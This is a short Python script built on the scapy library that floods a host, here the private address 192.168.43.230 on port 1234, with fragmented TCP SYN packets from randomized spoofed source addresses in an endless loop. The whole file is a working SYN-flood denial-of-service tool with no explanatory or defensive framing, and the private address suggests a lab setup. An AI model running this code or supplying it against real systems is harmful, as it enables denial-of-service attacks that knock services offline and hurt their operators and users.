from scapy.all import *

def tcp_syn(ip_address,dport,sport=1234):
	s_addr = RandIP()
	d_addr = ip_address
    # Seq no
	packet = IP(src=s_addr,dst=d_addr)/TCP(sport=sport,dport=dport,seq=RandShort(),flags="S")
	send(fragment(packet*30))

while(True):
	tcp_syn("192.168.43.230",1234,4000)
